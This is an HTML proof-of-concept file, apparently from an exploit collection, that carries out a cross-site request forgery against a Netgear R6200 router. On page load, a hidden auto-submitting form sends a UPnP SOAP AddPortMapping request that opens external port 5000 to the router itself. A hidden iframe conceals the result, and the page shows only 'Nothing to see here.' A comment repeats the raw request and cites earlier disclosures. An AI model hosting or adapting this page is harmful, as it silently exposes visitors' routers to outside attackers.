netgear/r6200/addportmapping-csrf/addportmapping.html

<html>
<!--
Proper UPnP SOAP request for AddPortMapping
****************************************************************
POST /Public_UPNP_C3 HTTP/1.1
SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
Host: 192.168.0.1:5000
Content-Type: text/xml
Content-Length: 639

<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
	<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewPortMappingDescription>none</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration><NewInternalClient>192.168.0.1</NewInternalClient><NewEnabled>True</NewEnabled><NewExternalPort>5000</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>5000</NewInternalPort>
	</m:AddPortMapping>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
****************************************************************
-->
<body>
    <script>
    function redirect(){
        
    }
    </script>
    <form onsubmit="alert('hello')" style="display:none" action="http://192.168.0.1:5000/Public_UPNP_C3" enctype="text/plain" method="POST" id="submitme" target="hidden_frame">
        <textarea name="soaprequest" rows="20" cols="80">
            <?xml version="1.0"?>
            <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <SOAP-ENV:Body>
                <m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
                    <NewPortMappingDescription>none</NewPortMappingDescription>
                    <NewLeaseDuration>0</NewLeaseDuration>
                    <NewInternalClient>192.168.0.1</NewInternalClient>
                    <NewEnabled>1</NewEnabled>
                    <NewExternalPort>5000</NewExternalPort>
                    <NewRemoteHost></NewRemoteHost>
                    <NewProtocol>TCP</NewProtocol>
                    <NewInternalPort>5000</NewInternalPort>
                </m:AddPortMapping>
            </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>
        </textarea>
        <input type="submit" value="Send" id="input"/>
    </form>
    <script>
    
    window.onload = function(){
        resp=document.getElementById('submitme').submit();
    }
    </script>
    <iframe style="display:none" name="hidden_frame"></iframe>
    <h1>Nothing to see here.
</body>
</html>
<!-- previously discovered:
https://gist.github.com/phikshun/9632445

More here:
https://www.blackhat.com/presentations/bh-usa-08/Squire/BH_US_08_Squire_A_Fox_in_the_Hen_House%20White%20Paper.pdf
-->

